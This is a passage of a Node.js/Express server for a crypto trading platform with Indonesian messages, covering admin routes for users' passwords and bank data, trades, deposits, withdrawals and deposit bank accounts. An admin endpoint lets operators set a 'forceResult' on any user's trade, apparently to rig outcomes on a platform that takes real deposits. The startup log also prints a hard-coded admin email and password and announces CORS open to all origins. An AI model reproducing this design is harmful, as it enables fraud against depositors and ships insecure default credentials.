        await User.findByIdAndUpdate(userId, { password: hashedPassword });

        await logActivity(req.user._id, 'Change Password', `Changed password for user ${userId}`, req);

        res.json({ message: 'Password berhasil diubah' });
    } catch (error) {
        console.error('❌ Admin change password error:', error.message);
        res.status(500).json({ error: 'Gagal mengubah password' });
    }
});

// Admin - Get user bank data
app.get('/api/admin/user/:userId/bank', authenticateToken, requireAdmin, async (req, res) => {
    try {
        const user = await User.findById(req.params.userId);
        res.json({ bankData: user.bankData || {} });
    } catch (error) {
        console.error('❌ Admin user bank error:', error.message);
        res.status(500).json({ error: 'Gagal memuat data bank' });
    }
});

// Admin - Update user bank data
app.put('/api/admin/user/:userId/bank', authenticateToken, requireAdmin, async (req, res) => {
    try {
        const { userId } = req.params;
        const { bankName, accountNumber, accountHolder } = req.body;

        await User.findByIdAndUpdate(userId, {
            bankData: { bankName, accountNumber, accountHolder }
        });

        await logActivity(req.user._id, 'Update User Bank', `Updated bank data for user ${userId}`, req);

        res.json({ message: 'Data bank berhasil diupdate' });
    } catch (error) {
        console.error('❌ Admin update user bank error:', error.message);
        res.status(500).json({ error: 'Gagal mengupdate data bank' });
    }
});

// Admin - Delete user bank data
app.delete('/api/admin/user/:userId/bank', authenticateToken, requireAdmin, async (req, res) => {
    try {
        const { userId } = req.params;

        await User.findByIdAndUpdate(userId, {
            $unset: { bankData: 1 }
        });

        await logActivity(req.user._id, 'Delete User Bank', `Deleted bank data for user ${userId}`, req);

        res.json({ message: 'Data bank berhasil dihapus' });
    } catch (error) {
        console.error('❌ Admin delete user bank error:', error.message);
        res.status(500).json({ error: 'Gagal menghapus data bank' });
    }
});

// Admin - Get all trades
app.get('/api/admin/trades', authenticateToken, requireAdmin, async (req, res) => {
    try {
        const { status } = req.query;
        const query = {};
        if (status) query.status = status;

        const trades = await Trade.find(query)
            .populate('userId', 'name email phone')
            .sort({ createdAt: -1 })
            .limit(100);

        res.json({ trades });
    } catch (error) {
        console.error('❌ Admin trades error:', error.message);
        res.status(500).json({ error: 'Gagal memuat trades' });
    }
});

// Admin - Control trade
app.put('/api/admin/trade/:tradeId', authenticateToken, requireAdmin, async (req, res) => {
    try {
        const { tradeId } = req.params;
        const { forceResult } = req.body;

        await Trade.findByIdAndUpdate(tradeId, { forceResult });

        await logActivity(req.user._id, 'Control Trade', `Set trade ${tradeId} force result: ${forceResult}`, req);

        res.json({ message: 'Trade control berhasil diupdate' });
    } catch (error) {
        console.error('❌ Admin control trade error:', error.message);
        res.status(500).json({ error: 'Gagal mengupdate trade control' });
    }
});

// Admin - Get all deposits
app.get('/api/admin/deposits', authenticateToken, requireAdmin, async (req, res) => {
    try {
        const { status, limit = 50 } = req.query;
        const query = {};
        if (status) query.status = status;

        const queryTime = Date.now();
        
        const deposits = await Deposit.find(query)
            .populate('userId', 'name email phone')
            .sort({ createdAt: -1 })
            .limit(parseInt(limit));

        const responseTime = Date.now() - queryTime;

        res.json({ 
            deposits,
            queryTime: responseTime,
            count: deposits.length
        });
    } catch (error) {
        console.error('❌ Admin deposits error:', error.message);
        res.status(500).json({ error: 'Gagal memuat deposits' });
    }
});

// Admin - Process deposit
app.put('/api/admin/deposit/:depositId', authenticateToken, requireAdmin, async (req, res) => {
    try {
        const { depositId } = req.params;
        const { status, adminNotes } = req.body;

        const deposit = await Deposit.findByIdAndUpdate(depositId, {
            status,
            adminNotes,
            processedAt: new Date(),
            processedBy: req.user._id
        }, { new: true }).populate('userId');

        // If approved, add to user balance
        if (status === 'approved') {
            await User.findByIdAndUpdate(deposit.userId._id, {
                $inc: { balance: deposit.amount }
            });

            // Emit to user
            io.to(deposit.userId._id.toString()).emit('depositApproved', {
                amount: deposit.amount
            });
        }

        await logActivity(req.user._id, 'Process Deposit', `${status} deposit ${depositId}`, req);

        res.json({ message: `Deposit ${status}`, deposit });
    } catch (error) {
        console.error('❌ Admin process deposit error:', error.message);
        res.status(500).json({ error: 'Gagal memproses deposit' });
    }
});

// Admin - Get all withdrawals
app.get('/api/admin/withdrawals', authenticateToken, requireAdmin, async (req, res) => {
    try {
        const { status } = req.query;
        const query = {};
        if (status) query.status = status;

        const withdrawals = await Withdrawal.find(query)
            .populate('userId', 'name email phone')
            .sort({ createdAt: -1 })
            .limit(100);

        res.json({ withdrawals });
    } catch (error) {
        console.error('❌ Admin withdrawals error:', error.message);
        res.status(500).json({ error: 'Gagal memuat withdrawals' });
    }
});

// Admin - Process withdrawal
app.put('/api/admin/withdrawal/:withdrawalId', authenticateToken, requireAdmin, async (req, res) => {
    try {
        const { withdrawalId } = req.params;
        const { status, adminNotes } = req.body;

        const withdrawal = await Withdrawal.findByIdAndUpdate(withdrawalId, {
            status,
            adminNotes,
            processedAt: new Date(),
            processedBy: req.user._id
        }, { new: true });

        // If rejected, return balance to user
        if (status === 'rejected') {
            await User.findByIdAndUpdate(withdrawal.userId, {
                $inc: { balance: withdrawal.amount }
            });
        }

        await logActivity(req.user._id, 'Process Withdrawal', `${status} withdrawal ${withdrawalId}`, req);

        res.json({ message: `Withdrawal ${status}`, withdrawal });
    } catch (error) {
        console.error('❌ Admin process withdrawal error:', error.message);
        res.status(500).json({ error: 'Gagal memproses withdrawal' });
    }
});

// Admin - Bank account management
app.get('/api/admin/bank-accounts', authenticateToken, requireAdmin, async (req, res) => {
    try {
        const accounts = await BankAccount.find().sort({ createdAt: -1 });
        res.json({ accounts });
    } catch (error) {
        console.error('❌ Admin bank accounts error:', error.message);
        res.status(500).json({ error: 'Gagal memuat bank accounts' });
    }
});

app.post('/api/admin/bank-accounts', authenticateToken, requireAdmin, async (req, res) => {
    try {
        const account = new BankAccount(req.body);
        await account.save();

        await logActivity(req.user._id, 'Create Bank Account', `Created bank account ${account.bankName}`, req);

        res.json({ message: 'Bank account created', account });
    } catch (error) {
        console.error('❌ Admin create bank account error:', error.message);
        res.status(500).json({ error: 'Gagal membuat bank account' });
    }
});

app.put('/api/admin/bank-accounts/:accountId', authenticateToken, requireAdmin, async (req, res) => {
    try {
        const account = await BankAccount.findByIdAndUpdate(req.params.accountId, req.body, { new: true });

        await logActivity(req.user._id, 'Update Bank Account', `Updated bank account ${account.bankName}`, req);

        res.json({ message: 'Bank account updated', account });
    } catch (error) {
        console.error('❌ Admin update bank account error:', error.message);
        res.status(500).json({ error: 'Gagal mengupdate bank account' });
    }
});

app.patch('/api/admin/bank-accounts/:accountId/toggle', authenticateToken, requireAdmin, async (req, res) => {
    try {
        const account = await BankAccount.findById(req.params.accountId);
        account.isActive = !account.isActive;
        await account.save();

        await logActivity(req.user._id, 'Toggle Bank Account', `${account.isActive ? 'Activated' : 'Deactivated'} bank account ${account.bankName}`, req);

        res.json({ 
            message: `Bank account ${account.isActive ? 'activated' : 'deactivated'}`,
            account 
        });
    } catch (error) {
        console.error('❌ Admin toggle bank account error:', error.message);
        res.status(500).json({ error: 'Gagal toggle bank account' });
    }
});

app.delete('/api/admin/bank-accounts/:accountId', authenticateToken, requireAdmin, async (req, res) => {
    try {
        const account = await BankAccount.findByIdAndDelete(req.params.accountId);

        await logActivity(req.user._id, 'Delete Bank Account', `Deleted bank account ${account.bankName}`, req);

        res.json({ message: 'Bank account deleted' });
    } catch (error) {
        console.error('❌ Admin delete bank account error:', error.message);
        res.status(500).json({ error: 'Gagal menghapus bank account' });
    }
});

// Admin - Database health check
app.get('/api/admin/health/database', authenticateToken, requireAdmin, async (req, res) => {
    try {
        const queryTime = Date.now();
        
        const [userCount, tradeCount, depositCount] = await Promise.all([
            User.countDocuments(),
            Trade.countDocuments(),
            Deposit.countDocuments()
        ]);

        const responseTime = Date.now() - queryTime;

        res.json({
            status: 'healthy',
            queryTime: responseTime,
            collections: {
                users: userCount,
                trades: tradeCount,
                deposits: depositCount
            },
            database: {
                connection: mongoose.connection.readyState === 1 ? 'connected' : 'disconnected',
                host: mongoose.connection.host,
                name: mongoose.connection.name
            }
        });
    } catch (error) {
        console.error('❌ Database health check error:', error.message);
        res.status(500).json({ 
            status: 'unhealthy',
            error: error.message 
        });
    }
});

// ====================================
// SOCKET.IO CONNECTION
// ====================================
io.on('connection', (socket) => {
    console.log('👤 User connected:', socket.id);

    socket.on('join', (userId) => {
        socket.join(userId);
        console.log(`👤 User ${userId} joined room`);
    });

    socket.on('subscribe_prices', () => {
        socket.emit('priceUpdate', cryptoPrices);
    });

    socket.on('subscribe_charts', (data) => {
        const { symbol, timeframe } = data;
        // Send chart data - simplified for demo
        socket.emit('chartUpdate', {
            symbol,
            timeframe,
            data: [] // Chart data would go here
        });
    });

    socket.on('disconnect', () => {
        console.log('👤 User disconnected:', socket.id);
    });
});

// ====================================
// ERROR HANDLING
// ====================================

// 404 handler
app.use('*', (req, res) => {
    res.status(404).json({ error: 'Endpoint tidak ditemukan' });
});

// Global error handler
app.use((error, req, res, next) => {
    console.error('❌ Global error:', error.message);
    
    if (error instanceof multer.MulterError) {
        if (error.code === 'LIMIT_FILE_SIZE') {
            return res.status(400).json({ error: 'File terlalu besar (maksimal 5MB)' });
        }
    }
    
    res.status(500).json({ 
        error: 'Terjadi kesalahan server',
        message: process.env.NODE_ENV === 'development' ? error.message : undefined
    });
});

// Graceful shutdown
process.on('SIGINT', async () => {
    console.log('🔄 Shutting down gracefully...');
    await mongoose.connection.close();
    server.close(() => {
        console.log('✅ Server closed');
        process.exit(0);
    });
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('❌ Unhandled Rejection at:', promise, 'reason:', reason);
});

process.on('uncaughtException', (error) => {
    console.error('❌ Uncaught Exception:', error.message);
    process.exit(1);
});

// ====================================
// START SERVER
// ====================================
async function startServer() {
    try {
        console.log('🚀 Starting TradeStation Server...');
        
        // Connect to database first
        await connectDB();
        
        server.listen(PORT, '0.0.0.0', () => {
            console.log(`
✅ TradeStation Server Started Successfully!
📍 Port: ${PORT}
🔒 Environment: ${process.env.NODE_ENV || 'development'}
🌍 CORS: Enabled for all origins
📡 Socket.IO: Enabled
📁 File Upload: Enabled (5MB limit)
🛡️  Security: Helmet enabled
⚡ Rate Limiting: Enabled
📊 MongoDB: ${mongoose.connection.readyState === 1 ? 'Connected' : 'Connecting...'}

📋 Admin Access:
   Email: admin@tradestation.com
   Password: admin123456

📋 Available Routes:
   🔐 POST /api/register - User registration
   🔐 POST /api/login - User login
   👤 GET /api/profile - Get user profile
   💰 GET /api/prices - Get crypto prices
   📈 POST /api/trade - Create trade
   💳 POST /api/deposit - Create deposit
   💸 POST /api/withdrawal - Create withdrawal
   🏦 GET /api/bank-accounts - Get bank accounts
   🔧 GET /api/admin/* - Admin routes
   ❤️  GET /api/health - Health check
            `);
        });
    } catch (error) {
        console.error('❌ Failed to start server:', error.message);
        process.exit(1);
    }
}

startServer();
